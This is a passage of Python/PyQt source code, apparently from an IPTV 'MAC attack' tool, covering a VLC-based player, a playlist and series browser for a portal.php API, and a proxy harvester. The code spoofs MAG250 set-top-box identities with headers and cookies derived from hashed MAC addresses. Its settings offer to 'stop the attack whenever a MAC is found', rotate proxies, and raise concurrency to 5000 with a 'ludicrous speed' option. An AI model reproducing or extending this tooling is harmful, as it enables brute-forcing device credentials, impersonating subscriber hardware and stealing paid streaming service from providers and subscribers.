        self.left_layout.addLayout(self.progress_layout)

        # Create "ERROR" label and hide it initially
        self.error_label = QLabel("ERROR: Error message label")
        self.error_label.setStyleSheet("color: red; font-size: 10pt; margin-bottom: 15px;")
        self.left_layout.addWidget(self.error_label, alignment=Qt.AlignRight)
        self.error_label.setVisible(False)  # Initially hide the label

        self.left_widget = QWidget()
        self.left_widget.setLayout(self.left_layout)
        self.left_widget.setFixedWidth(240)

        main_layout.addWidget(self.left_widget)

        # RIGHT SECTION: Video area and controls
        right_layout = QVBoxLayout()
        right_layout.setContentsMargins(0, 0, 0, 0)
        right_layout.setSpacing(0)

        # Video frame
        self.video_frame = QWidget(self)
        self.video_frame.setStyleSheet("background-color: black;")
        right_layout.addWidget(self.video_frame)

        # Add right layout to main layout
        main_layout.addLayout(right_layout)

        # Configure the video player for the video frame
        if sys.platform.startswith('linux'):
            self.videoPlayer.set_xwindow(self.video_frame.winId())
        elif sys.platform == "win32":
            self.videoPlayer.set_hwnd(self.video_frame.winId())
        elif sys.platform == "darwin":
            self.videoPlayer.set_nsobject(int(self.video_frame.winId()))

        # Load intro video
        if getattr(sys, 'frozen', False):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.abspath(".")
        video_path = os.path.join(base_path, 'include', 'intro.mp4')
        self.videoPlayer.set_media(self.instance.media_new(video_path))
        logging.info(video_path)
        self.startplay = 1 #play the video when switched to the video tab
        #self.videoPlayer.play()
        # Disable mouse and key input for video
        self.videoPlayer.video_set_mouse_input(False)
        self.videoPlayer.video_set_key_input(False)

        # progress animation 
        self.progress_animation = QPropertyAnimation(self.progress_bar, b"value")
        self.progress_animation.setDuration(1000)
        self.progress_animation.setEasingCurve(QEasingCurve.Linear)
        
        
    def on_initial_playlist_received(self, data):
        if self.current_request_thread != self.sender():
            logging.info("Received data from an old thread. Ignoring.")
            return  # Ignore signals from older threads

        if not data:
            self.stop_request_thread()
            self.error_label.setText("ERROR: Unable to connect to the host")
            self.error_label.setVisible(True)
            logging.info("Playlist data is empty.")
            self.current_request_thread = None
            return

        for tab_name, tab_data in data.items():
            self.tab_info = self.tab_data.get(tab_name)  # Use the dictionary with tab data
            if not self.tab_info:
                logging.info(f"Unknown tab name: {tab_name}")
                continue

            self.tab_info["playlist_data"] = tab_data
            self.tab_info["current_category"] = None
            self.tab_info["navigation_stack"] = []
            self.update_playlist_view(tab_name)
            
        logging.debug("Playlist data loaded into tabs.")
        self.current_request_thread = None

    def update_playlist_view(self, tab_name):
        self.tab_info = self.tab_data[tab_name]
        self.playlist_model = self.tab_info["self.playlist_model"]
        self.playlist_model.clear()
        self.tab_info["current_view"] = "categories"
        
        self.playlist_view = self.tab_info["playlist_view"]  

        if self.tab_info["navigation_stack"]:
            go_back_item = QStandardItem("Go Back")
            self.playlist_model.appendRow(go_back_item)

        if self.tab_info["current_category"] is None:
            for item in self.tab_info["playlist_data"]:
                name = item["name"]
                list_item = QStandardItem(name)
                list_item.setData(item, Qt.UserRole)
                list_item.setData("category", Qt.UserRole + 1)
                self.playlist_model.appendRow(list_item)
        else:
            self.retrieve_channels(tab_name, self.tab_info["current_category"])
        self.search_input.clear()

    def update_channel_view(self, tab_name):
        self.tab_info = self.tab_data[tab_name]
        self.playlist_model = self.tab_info["self.playlist_model"]
        self.playlist_model.clear()
        self.tab_info["current_view"] = "channels"

        if self.tab_info["navigation_stack"]:
            go_back_item = QStandardItem("Go Back")
            self.playlist_model.appendRow(go_back_item)

        for channel in self.tab_info["current_channels"]:
            channel_name = channel["name"]
            list_item = QStandardItem(channel_name)
            list_item.setData(channel, Qt.UserRole)
            item_type = channel.get("item_type", "channel")
            list_item.setData(item_type, Qt.UserRole + 1)
            self.playlist_model.appendRow(list_item)
        self.search_input.clear()

    def retrieve_channels(self, tab_name, category):
        category_type = category["category_type"]
        category_id = category.get("category_id") or category.get("genre_id")

        try:
            self.set_progress(0)

            # If a current thread is running, interrupt it and set up to start a new one
            if self.current_request_thread is not None and self.current_request_thread.isRunning():
                logging.info("RequestThread running, stopping it.")
                self.current_request_thread.requestInterruption()
                # Connect the finished signal to start a new thread once the old one is done
                self.current_request_thread.wait()  # Wait for the thread to finish
                self.current_request_thread.finished.connect(lambda: self.start_new_thread(tab_name, category_type, category_id))
                return

            # If no thread is running, start a new one directly
            self.start_new_thread(tab_name, category_type, category_id)

        except Exception as e:
            logging.error(f"Exception in retrieve_channels: {e}")
            self.error_label.setText("An error occurred while retrieving channels.")
            self.error_label.setVisible(True)

    def on_channels_loaded(self, tab_name, channels):
        if self.current_request_thread != self.sender():
            logging.debug("Received channels from an old thread. Ignoring.")
            return  # Ignore signals from older threads

        self.tab_info = self.tab_data[tab_name]
        self.tab_info["current_channels"] = channels
        self.update_channel_view(tab_name)
        logging.debug(f"Channels loaded for tab {tab_name}: {len(channels)} items.")
        self.current_request_thread = None  # Reset the current thread
                
    def filter_playlist(self):
        search_term = self.search_input.text().lower()
        for tab_name, self.tab_info in self.tab_data.items():
            # Retrieve the playlist model and current view data
            playlist_model = self.tab_info.get("self.playlist_model")
            if not playlist_model:
                logging.debug(f"Warning: No 'playlist_model' found for tab '{tab_name}'. Skipping.")
                continue

            current_view = self.tab_info.get("current_view")
            self.visible_data = self.tab_info.get("playlist_data", [])

            # Filter the visible data
            filtered_data = self._filter_items(self.visible_data, search_term)

            # Filter other related data (channels, series) if necessary
            filtered_channels = self._filter_items(self.tab_info.get("current_channels", []), search_term)
            filtered_series = self._filter_items(self.tab_info.get("current_series_info", []), search_term)

            # Update the playlist model with the filtered data
            self._populate_playlist_model(playlist_model, filtered_channels, filtered_data, filtered_series)

            # Log what was filtered
            logging.debug(f"Filtered {len(filtered_data)} items for tab '{tab_name}' in view '{current_view}'.")

    def _populate_playlist_model(self, playlist_model, channels, playlists, series):
        """Helper function to clear and populate the playlist model."""
        playlist_model.clear()

        # Add the "Go Back" item if we are not in a filtered state
        if not self.search_input.text() and playlists:  # Only add Go Back if not filtering
            playlist_model.appendRow(QStandardItem("Go Back"))

        # Add filtered channels
        for item in channels:
            list_item = self._create_list_item(item, item['name'], item['item_type'])
            playlist_model.appendRow(list_item)

        # Add filtered playlists
        for item in playlists:
            name = item.get("name", "Unnamed") if isinstance(item, dict) else str(item)
            item_type = item.get("type", "category") if isinstance(item, dict) else str(item)
            playlist_item = self._create_list_item(item, name, item_type)
            playlist_model.appendRow(playlist_item)

        # Add filtered series (seasons/episodes)
        for item in series:
            item_type = item.get("item_type")
            if item_type == "season":
                name = f"Season {item['season_number']}"
            elif item_type == "episode":
                name = f"Episode {item['episode_number']}"
            else:
                name = item.get("name") or item.get("title")
            list_item = QStandardItem(name)
            list_item.setData(item, Qt.UserRole)
            list_item.setData(item_type, Qt.UserRole + 1)
            playlist_model.appendRow(list_item)
            
    def _filter_items(self, items, search_term):
        """Helper function to filter items based on the search term."""
        return [
            item for item in items
            if search_term in str(item).lower()  # Make sure it checks the correct property for filtering
        ]



    def _create_list_item(self, data, name, item_type):
        """Helper function to create a list item with attached data."""
        list_item = QStandardItem(name)
        list_item.setData(data, Qt.UserRole)
        list_item.setData(item_type, Qt.UserRole + 1)
        return list_item

    def get_playlist(self):
        """
        Function to fetch and populate the playlist based on the hostname and MAC address input.
        Uses a separate thread to handle the request to avoid blocking the UI.
        """
        self.error_label.setVisible(False)  # Hide the error label initially
        self.playlist_model.clear()  # Clear the current playlist

        # Get inputs from the user
        hostname_input = self.hostname_input.text().strip()
        mac_address = self.mac_input.text().strip()

        # Check if both hostname and MAC address are provided
        if not hostname_input or not mac_address:
            self.error_label.setText("ERROR: Missing input")
            self.error_label.setVisible(True)  # Show the error label if inputs are missing
            return

        # Parse the hostname URL
        parsed_url = urlparse(hostname_input)
        # If the URL does not have a scheme or netloc, try to add "http://"
        if not parsed_url.scheme and not parsed_url.netloc:
            parsed_url = urlparse(f"http://{hostname_input}")
        elif not parsed_url.scheme:
            parsed_url = parsed_url._replace(scheme="http")

        # Set the base URL and MAC address
        self.base_url = urlunparse((parsed_url.scheme, parsed_url.netloc, "", "", "", ""))
        self.mac_address = mac_address

        # Stop the current request thread if one is already running
        if self.current_request_thread is not None and self.current_request_thread.isRunning():
            logging.info("Stopping current RequestThread to start a new one.")
            self.current_request_thread.wait()  # Wait for the thread to finish before starting a new one

        # Initialize a new RequestThread for fetching the playlist
        self.request_thread = RequestThread(self.base_url, mac_address)
        # Connect signals for when the request completes and for progress updates
        self.request_thread.request_complete.connect(self.on_initial_playlist_received)
        self.request_thread.update_progress.connect(self.set_progress)
        self.request_thread.start()  # Start the request thread
        self.current_request_thread = self.request_thread  # Set the current request thread
        logging.info("Started new RequestThread for playlist.")

    def retrieve_series_info(self, tab_name, context_data, season_number=None):
        # Add the current series/seasons to the navigation stack
        self.tab_info = self.tab_data[tab_name]
        if not season_number:
            self.tab_info["navigation_stack"].append(context_data)
        else:
            self.tab_info["navigation_stack"].append({"season_number": season_number})
        try:
            session = requests.Session()
            retry_strategy = Retry(
                total=5,  # Number of retry attempts
                backoff_factor=1,  # Delay between retries (e.g., 1 second)
                status_forcelist=[429, 500, 502, 503, 504],  # Retry on these status codes
                allowed_methods=["HEAD", "GET", "OPTIONS"]  # Methods to retry
            )
            adapter = HTTPAdapter(max_retries=retry_strategy)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            url = self.base_url
            mac_address = self.mac_address
            token = get_token(session, url, mac_address)

            if token:
                series_id = context_data.get("id")
                if not series_id:
                    self.error_label.setText(f"Series ID missing in context data: {context_data}")
                    self.error_label.setVisible(True)
                    return
                    
                #convert the mac into various hashes, if anything this will add randomness to the requests
                mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
                mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
                mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()

                
                serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
                device_id = mac_sha256
                device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
                device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input

                cookies = {           
                    "adid": mac_sha1,
                    "debug": "1",
                    "device_id2": device_id2,
                    "device_id": device_id,
                    "hw_version": "1.7-BD-00",
                    "mac": mac_address,
                    "sn": serial[:13], #cut to 13 digits
                    "stb_lang": "en",
                    "timezone": "America/Los_Angeles",             
                }
            
                headers = {
                    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                    "Authorization": f"Bearer {token}",
                    "X-User-Agent": "Model: MAG250; Link: WiFi",
                }

                if season_number is None:
                    # Fetch seasons
                    all_seasons = []
                    page_number = 0
                    seasons_url = f"{url}/portal.php?type=series&action=get_ordered_list&movie_id={series_id}&season_id=0&episode_id=0&JsHttpRequest=1-xml&p={page_number}"
                    logging.debug(
                        f"Fetching seasons URL: {seasons_url}, headers: {headers}, cookies: {cookies}"
                    )

                    while True:
                        response = session.get(
                            seasons_url, cookies=cookies, headers=headers, timeout=20
                        )
                        logging.debug(f"Seasons response: {response.text}")
                        if response.status_code == 200:
                            seasons_data = response.json().get("js", {}).get("data", [])
                            if not seasons_data:
                                break
                            for season in seasons_data:
                                season_id = season.get("id", "")
                                season_number_extracted = None
                                if season_id.startswith("season"):
                                    match = re.match(r"season(\d+)", season_id)
                                    if match:
                                        season_number_extracted = int(match.group(1))
                                    else:
                                        self.error_label.setText(f"Unexpected season id format: {season_id}")
                                        self.error_label.setVisible(True)
                                else:
                                    match = re.match(r"\d+:(\d+)", season_id)
                                    if match:
                                        season_number_extracted = int(match.group(1))
                                    else:
                                        self.error_label.setText(f"Unexpected season id format: {season_id}")
                                        self.error_label.setVisible(True)

                                season["season_number"] = season_number_extracted
                                season["item_type"] = "season"
                            all_seasons.extend(seasons_data)
                            total_items = response.json().get(
                                "js", {}
                            ).get("total_items", len(all_seasons))
                            logging.debug(
                                f"Fetched {len(all_seasons)} seasons out of {total_items}."
                            )
                            if len(all_seasons) >= total_items:
                                break
                            page_number += 1
                        else:
                            self.error_label.setText(f"Failed to fetch seasons for page {page_number} with status code {response.status_code}")
                            self.error_label.setVisible(True)

                            break

                    if all_seasons:
                        self.tab_info["current_series_info"] = all_seasons
                        self.tab_info["current_view"] = "seasons"
                        self.update_series_view(tab_name)
                else:
                    # Fetch episodes for the given season
                    series_list = context_data.get("series", [])
                    if not series_list:
                        logging.info("No episodes found in this season.")
                        return

                    logging.debug(f"Series episodes found: {series_list}")
                    all_episodes = []
                    for episode_number in series_list:
                        episode = {
                            "id": f"{series_id}:{episode_number}",
                            "series_id": series_id,
                            "season_number": season_number,
                            "episode_number": episode_number,
                            "name": f"Episode {episode_number}",
                            "item_type": "episode",
                            "cmd": context_data.get("cmd"),
                        }
                        logging.debug(f"Episode details: {episode}")
                        all_episodes.append(episode)

                    if all_episodes:
                        self.tab_info["current_series_info"] = all_episodes
                        self.tab_info["current_view"] = "episodes"
                        self.update_series_view(tab_name)
                    else:
                        logging.info("No episodes found.")
            else:
                self.error_label.setText("Failed to retrieve token.")
                self.error_label.setVisible(True)
        except KeyError as e:
            logging.error(f"KeyError retrieving series info: {str(e)}")
        except Exception as e:
            logging.error(f"Error retrieving series info: {str(e)}")
        
    def update_series_view(self, tab_name):
        self.tab_info = self.tab_data[tab_name]
        self.playlist_model = self.tab_info["self.playlist_model"]
        self.playlist_model.clear()

        if self.tab_info["navigation_stack"]:
            go_back_item = QStandardItem("Go Back")
            self.playlist_model.appendRow(go_back_item)

        # If we're viewing seasons or episodes, only show those, not the full series list.
        if self.tab_info["current_view"] == "seasons":
            for item in self.tab_info["current_series_info"]:
                item_type = item.get("item_type")
                if item_type == "season":
                    name = f"Season {item['season_number']}"
                else:
                    continue  # Skip if it's not a season
                list_item = QStandardItem(name)
                list_item.setData(item, Qt.UserRole)
                list_item.setData(item_type, Qt.UserRole + 1)
                self.playlist_model.appendRow(list_item)
        elif self.tab_info["current_view"] == "episodes":
            for item in self.tab_info["current_series_info"]:
                item_type = item.get("item_type")
                if item_type == "episode":
                    name = f"Episode {item['episode_number']}"
                    list_item = QStandardItem(name)
                    list_item.setData(item, Qt.UserRole)
                    list_item.setData(item_type, Qt.UserRole + 1)
                    self.playlist_model.appendRow(list_item)

        self.search_input.clear()

    def go_back(self):
        # When going back, ensure we reset to the unfiltered data from the current page
        for tab_name, self.tab_info in self.tab_data.items():
            playlist_model = self.tab_info.get("self.playlist_model")
            if not playlist_model:
                logging.debug(f"Warning: No 'playlist_model' found for tab '{tab_name}'. Skipping.")
                continue
            
            # Clear the filter state and store the current view data before applying the filter
            self.is_filter_active = False
            self.previous_data[tab_name] = {
                'channels': self.tab_info.get("current_channels", []),
                'playlists': self.tab_info.get("playlist_data", []),
                'series': self.tab_info.get("current_series_info", [])
            }

            # Rebuild the model with unfiltered data
            self._populate_playlist_model(playlist_model, 
                                           self.previous_data[tab_name]['channels'],
                                           self.previous_data[tab_name]['playlists'],
                                           self.previous_data[tab_name]['series'])

            logging.debug(f"Reverted to unfiltered data for tab '{tab_name}'.")


    def update_proxy(self):
        
        """Update the proxy settings in VLC based on user input."""
        proxy_address = self.proxy_input.text()

        # Set or remove the environment variables for the proxy
        if proxy_address:
            os.environ["http_proxy"] = proxy_address
            os.environ["https_proxy"] = proxy_address
        else:
            if "http_proxy" in os.environ:
                del os.environ["http_proxy"]
            if "https_proxy" in os.environ:
                del os.environ["https_proxy"]

    def restart_vlc_instance(self):
        referer_url = self.hostname_input.text()  # Get the referer URL from the QLineEdit
        if getattr(sys, 'frozen', False):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.abspath(".")
            
        proxy_address = self.proxy_input.text()
        self.modify_vlc_proxy(proxy_address)
        """Restart VLC with the new proxy settings."""
        self.videoPlayer.release()  # Release the old player
        self.instance.release()     # Release the old instance

        # Reinitialize VLC instance with updated proxy environment variables
        logging.debug(f'--config={base_path}\\include\\vlcrc')
        self.instance = vlc.Instance(
            [
                f'--config={base_path}\\include\\vlcrc',# config file holding the proxy info
                f'--http-proxy={proxy_address}',        # setting proxy by commandline
                f'--http-referrer={referer_url}',       # Set the referer URL (from QLineEdit)
                '--repeat',                             # Keep connected if kicked off
                '--no-xlib',                            # Disable X11 on Linux (if you're on Linux)
                '--vout=directx',                       # Video output method for Windows
                '--no-plugins-cache',                   # Don't cache plugins
                '--log-verbose=1',                      # Verbose logging
                '--network-caching=1000',               # Increase the network caching (in milliseconds) for smoother playback
                '--live-caching=1000',                  # Caching for live streams, can help with interruptions
                '--reconnect',                          # Enable automatic reconnection
                '--reconnect-streams=10',               # Try reconnecting this many times
                '--reconnect-delay=3',                  # Delay between reconnect attempts (in seconds)
                '--reconnect-timeout=5',                # Timeout for each reconnect attempt
                '--network-caching=3000',               # Increase network buffer size (in ms)
                '--file-caching=3000',                  # Increase file buffer size (in ms)
                '--live-caching=3000',                  # Increase live stream buffer size (in ms)
                '--sout-mux-caching=2000',              # Increase muxing buffer                
            ]
        )
        self.videoPlayer = self.instance.media_player_new()

        # Reconfigure video frame (this step depends on the platform)
        if sys.platform.startswith('linux'):
            self.videoPlayer.set_xwindow(self.video_frame.winId())
        elif sys.platform == "win32":
            self.videoPlayer.set_hwnd(self.video_frame.winId())
        elif sys.platform == "darwin":
            self.videoPlayer.set_nsobject(int(self.video_frame.winId()))

        # Disable mouse and key input for video
        self.videoPlayer.video_set_mouse_input(False)
        self.videoPlayer.video_set_key_input(False)
        
    def build_Proxy_gui(self, parent):
        proxy_layout = QVBoxLayout(parent)

        # Horizontal layout for checkbox and other input
        proxy_checkbox_layout = QHBoxLayout()

        # Add a 15px space on the left side
        proxy_checkbox_layout.addSpacing(15)

        # Checkbox for enabling proxy fetching
        self.proxy_enabled_checkbox = QCheckBox("Enable Proxies")
        self.proxy_enabled_checkbox.setFixedWidth(120)  # Set the checkbox width to 120px
        proxy_checkbox_layout.addWidget(self.proxy_enabled_checkbox)

        # Add a stretch to push elements to the right
        proxy_checkbox_layout.addStretch(1)

        # Label for "Remove proxies from list after"
        self.proxy_label = QLabel("Remove proxies after")
        self.proxy_label.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
        proxy_checkbox_layout.addWidget(self.proxy_label)

        # SpinBox for error count
        self.proxy_remove_errorcount = QSpinBox()
        self.proxy_remove_errorcount.setRange(0, 9)  # Restrict to 2-digit range
        self.proxy_remove_errorcount.setFixedWidth(30)  # Set width for 2 digits
        self.proxy_remove_errorcount.setValue(5)  # Default value
        self.proxy_remove_errorcount.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
        proxy_checkbox_layout.addWidget(self.proxy_remove_errorcount)

        # Label for "connection errors"
        self.connection_errors_label = QLabel("consecutive errors. (0 to disable)")
        self.connection_errors_label.setContentsMargins(0, 0, 0, 0)  # Set padding to 0
        proxy_checkbox_layout.addWidget(self.connection_errors_label)

        # Add a 15px space after the "connection errors" label
        spacer_after_errors = QSpacerItem(15, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
        proxy_checkbox_layout.addItem(spacer_after_errors)

        # Ensure all elements are aligned to the right
        proxy_checkbox_layout.setSpacing(0)  # Remove spacing between widgets
        proxy_checkbox_layout.setAlignment(Qt.AlignRight)

        # Align the checkbox layout components
        proxy_checkbox_layout.setAlignment(self.proxy_enabled_checkbox, Qt.AlignLeft)
        proxy_checkbox_layout.setAlignment(self.proxy_label, Qt.AlignLeft)
        proxy_checkbox_layout.setAlignment(self.proxy_remove_errorcount, Qt.AlignLeft)
        proxy_checkbox_layout.setAlignment(self.connection_errors_label, Qt.AlignLeft)

        # Add the checkbox layout to the main layout
        proxy_layout.addLayout(proxy_checkbox_layout)

        # Label above the text box with 15px left margin
        proxybox_label = QLabel("Proxy list, Enter proxies into this box, or get some with the button below")
        proxybox_label.setContentsMargins(15, 0, 0, 0)  # Add 15px space on the left side
        proxy_layout.addWidget(proxybox_label)

        # Output Text Area
        self.proxy_textbox = QTextEdit()
        self.proxy_textbox.setStyleSheet("""
            color: black;
            background-color: lightgrey;
            border-left: 12px solid #2E2E2E;
            border-right: 12px solid #2E2E2E;
            border-bottom:  none;
            border-top: none;
        """)

        self.proxy_textbox.setReadOnly(False)
        monospace_font = QFont("Lucida Console", 10)  # You can use "Courier New" or other monospaced fonts like "Consolas"
        self.proxy_textbox.setFont(monospace_font)
        proxy_layout.addWidget(self.proxy_textbox)

        # Create a horizontal layout for the button and speed input
        generate_proxy_layout = QHBoxLayout()

        # Add spacer to the left of the generate button
        left_spacer_button = QSpacerItem(15, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
        generate_proxy_layout.addItem(left_spacer_button)

        # Button to generate proxies, connects to self.get_proxies() method
        self.generate_button = QPushButton("Get Working Proxies")
        self.generate_button.clicked.connect(self.get_proxies)
        self.generate_button.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)  # Set the size policy

        # Speed input (Slider)
        self.proxy_speed_label = QLabel("Speed:")
        self.proxy_concurrent_tests = QSlider(Qt.Horizontal)  # Changed from QSpinBox to QSlider
        self.proxy_concurrent_tests.setRange(1, 100)  # Range from 1 to 100
        self.proxy_concurrent_tests.setValue(100)  # Default value of 100
        self.proxy_concurrent_tests.setTickPosition(QSlider.TicksBelow)  # Show ticks below the slider
        self.proxy_concurrent_tests.setTickInterval(50)  # Interval between tick marks for better granularity

        # Dynamic label to show current value of the slider
        self.proxy_speed_value_label = QLabel(str(self.proxy_concurrent_tests.value()))

        # Connect the slider's valueChanged signal to a function that updates the label
        self.proxy_concurrent_tests.valueChanged.connect(self.update_proxy_fetching_speed)

        # Add the button and speed input (slider with label) to the layout
        generate_proxy_layout.addWidget(self.generate_button)
        generate_proxy_layout.addSpacing(15)  # Add 15px spacing between the button and the slider

        generate_proxy_layout.addWidget(self.proxy_speed_label)
        generate_proxy_layout.addWidget(self.proxy_concurrent_tests)
        generate_proxy_layout.addWidget(self.proxy_speed_value_label)  # Add the label showing the slider's value

        # Spacer to push the proxy count label to the right
        generate_proxy_layout.addStretch(1)  # This will push everything else to the left

        # Proxy count label that will be updated
        self.proxy_count_label = QLabel("Proxies: 0")
        self.proxy_count_label.setAlignment(Qt.AlignRight)  # Align the label to the right

        # Add 15px space to the right of the label using margins
        self.proxy_count_label.setContentsMargins(0, 0, 15, 0)  # Add 15px space to the right side of the label

        # Add the proxy count label to the layout
        generate_proxy_layout.addWidget(self.proxy_count_label)

        # Align the layout itself to the left
        generate_proxy_layout.setAlignment(Qt.AlignLeft)

        # Add the horizontal layout to the main proxy layout
        proxy_layout.addLayout(generate_proxy_layout)

        # Proxy console output Area
        self.proxy_output = QTextEdit()
        self.proxy_output.setStyleSheet("""
            color: green;
            background-color: black;
            border-left: 12px solid #2E2E2E;
            border-right: 12px solid #2E2E2E;
            border-bottom: none;
            border-top: none;
        """)
        self.proxy_output.setHtml("Proxy testing will output here...\n")
        self.proxy_output.setReadOnly(True)
        self.proxy_output.setFont(monospace_font)

        # Set the maximum height to 200px
        self.proxy_output.setMaximumHeight(60)

        # Add the proxy output area to the layout
        proxy_layout.addWidget(self.proxy_output)

        # Connect the textChanged signal to update the proxy count
        self.proxy_textbox.textChanged.connect(self.update_proxy_count)
   
    def update_proxy_count(self):
        # Get the number of lines in the proxy_textbox
        proxy_lines = self.proxy_textbox.toPlainText().splitlines()
        proxy_count = len(proxy_lines)
        
        # Update the label with the current number of proxies
        self.proxy_count_label.setText(f"Proxies: {proxy_count}")    
    
    def update_proxy_fetching_speed(self, value):
        # Log the value to confirm it's being passed correctly
        print(f"Setting proxy fetching speed to: {value}")
        
        # Update the speed for fetching and testing proxies
        self.proxy_fetcher.proxy_fetching_speed = value
        self.proxy_fetcher.proxy_testing_speed = value * 3  # Increase testing speed proportionally
        
        self.proxy_output.append(f"Proxy fetching speed set at: {value}")
        self.proxy_speed_value_label.setText(str(self.proxy_concurrent_tests.value()))
    
    def get_proxies(self):

        proxy_address = self.proxy_input.text()

        # remove any app proxy in use
        if proxy_address:
            if "http_proxy" in os.environ:
                del os.environ["http_proxy"]
            if "https_proxy" in os.environ:
                del os.environ["https_proxy"]






        self.proxy_fetcher.start()  # Start the background thread

    def update_proxy_output(self, text):
        """
        Updates the proxy_output textbox with the provided text.
        """
        self.proxy_output.append(text)

    def update_proxy_textbox(self, proxies):
        # Get the current text from the textbox and split it into a list
        current_proxies = self.proxy_textbox.toPlainText().splitlines()
        
        # Ensure proxies is a list; if it's a string, convert it to a single-item list
        if isinstance(proxies, str):
            proxies = [proxies]
        
        # Combine the current proxies with the new ones and remove duplicates
        combined_proxies = list(set(current_proxies + proxies))
        
        # Remove any empty strings and sort the list for consistency
        combined_proxies = sorted(filter(None, combined_proxies))
        
        # Set the updated proxies back to the textbox
        self.proxy_textbox.setText("\n".join(combined_proxies))

    def build_Settings_gui(self, Settings_frame):
        # Create the layout for the settings frame
        Settings_layout = QVBoxLayout(Settings_frame)

        # Set alignment to top
        Settings_layout.setAlignment(Qt.AlignTop)

        # Add the "Settings" label
        settings_label = QLabel("Settings")
        settings_label.setAlignment(Qt.AlignTop)
        Settings_layout.addWidget(settings_label)
        # Add a line under the "Settings" label
        line1 = QFrame()
        line1.setFrameShape(QFrame.HLine)
        line1.setFrameShadow(QFrame.Sunken)
        Settings_layout.addWidget(line1)
        
        # autostop checkbox
        self.autostop_checkbox = QCheckBox("Stop the attack whenever a MAC is found")
        Settings_layout.addWidget(self.autostop_checkbox)

        # successsound checkbox
        self.successsound_checkbox = QCheckBox("Play a sound whenever a MAC is found")
        Settings_layout.addWidget(self.successsound_checkbox)
        Settings_layout.addSpacing(15)  # Adds space
        
        # autoload macs checkbox
        self.autoloadmac_checkbox = QCheckBox("Load MAC into the player tab instantly when discovered")
        Settings_layout.addWidget(self.autoloadmac_checkbox)

        # autopause checkbox
        self.autopause_checkbox = QCheckBox("Pause the video when switching tabs")
        Settings_layout.addWidget(self.autopause_checkbox)
        Settings_layout.addSpacing(15)  # Adds space

        # Ludicrous speed checkbox
        self.ludicrous_speed_checkbox = QCheckBox("Enable Ludicrous speed! \n(This will likely crash your app, and probably even your computer)")
        Settings_layout.addWidget(self.ludicrous_speed_checkbox)
        
        # Connect the checkbox to the function that will change the slider ranges
        self.ludicrous_speed_checkbox.stateChanged.connect(self.enable_ludicrous_speed)        
        self.ludicrous_speed_checkbox.setStyleSheet("""
            QCheckBox:checked {
                background-color: Black;
                color: red;
            }
            QCheckBox {
                background-color: #666666;
                padding: 5px;
                border: 2px solid black;
            }
        """)      







        
        Settings_layout.addSpacing(55)  # Adds space

        # Add the "Tips" label
        tips_label = QLabel("Tips")
        tips_label.setAlignment(Qt.AlignTop)
        Settings_layout.addWidget(tips_label)
        # Add a line under the "Tips" label
        line2 = QFrame()
        line2.setFrameShape(QFrame.HLine)
        line2.setFrameShadow(QFrame.Sunken)
        Settings_layout.addWidget(line2)

        # Add the list of tips
        tips_text = QLabel(
            "<b>Video Controls:</b><br>"
            "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mouseclick/Space Bar - Toggle Pause<br>"
            "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Doubleclick/ESC - Toggle Fullscreen<br><br>"
            "<br>"
        )
        tips_text.setAlignment(Qt.AlignTop)
        Settings_layout.addWidget(tips_text)

        Settings_frame.setLayout(Settings_layout)

    def enable_ludicrous_speed(self):
        if self.ludicrous_speed_checkbox.isChecked():
            self.concurrent_tests.setRange(1, 5000)  
            self.proxy_concurrent_tests.setRange(1, 5000)
        else:
            self.concurrent_tests.setRange(1, 100)  # Default range
            self.proxy_concurrent_tests.setRange(1, 100)
  
    def update_mac_label(self, text):
        """Update the MAC address label in the main thread."""
        self.brute_mac_label.setText(text)

    def update_output_text(self, text):
            """Update the QTextEdit widget in the main thread."""
            self.output_text.append(text)

    def update_error_text(self, text):
        """Update the QTextEdit widget in the main thread."""
        self.error_text.append(text)  
        
    def build_mac_attack_gui(self, parent):
        layout = QVBoxLayout(parent)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)  

        # Combined layout for IPTV link, Speed, and Start/Stop buttons
        combined_layout = QHBoxLayout()
        combined_layout.setContentsMargins(0, 0, 0, 0)
        combined_layout.setSpacing(10)

        # Add spacer to the left of IPTV link label
        left_spacer = QSpacerItem(10, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
        combined_layout.addItem(left_spacer)
        layout.addSpacing(15)  # Adds space

        # IPTV link input
        self.iptv_link_label = QLabel("IPTV link:")
        self.iptv_link_entry = QLineEdit("http://evilvir.us.streamtv.to:8080/c/")
        combined_layout.addWidget(self.iptv_link_label)
        combined_layout.addWidget(self.iptv_link_entry)

        # Speed input (Slider)
        self.speed_label = QLabel("Speed:")
        self.concurrent_tests = QSlider(Qt.Horizontal)
        self.concurrent_tests.setRange(1, 100)
        self.concurrent_tests.setValue(5)
        self.concurrent_tests.setTickPosition(QSlider.TicksBelow)
        self.concurrent_tests.setTickInterval(1)
        combined_layout.addWidget(self.speed_label)
        combined_layout.addWidget(self.concurrent_tests)

        # Dynamic label to show current speed value
        self.speed_value_label = QLabel(str(self.concurrent_tests.value()))
        combined_layout.addWidget(self.speed_value_label)

        # Connect slider value change to update the dynamic label
        self.concurrent_tests.valueChanged.connect(
            lambda value: self.speed_value_label.setText(str(value))
        )

        # Start/Stop buttons
        self.start_button = QPushButton("Start")
        self.start_button.clicked.connect(self.TestDrive)
        self.stop_button = QPushButton("Stop")
        self.stop_button.clicked.connect(self.GiveUp)
        combined_layout.addWidget(self.start_button)
        combined_layout.addWidget(self.stop_button)

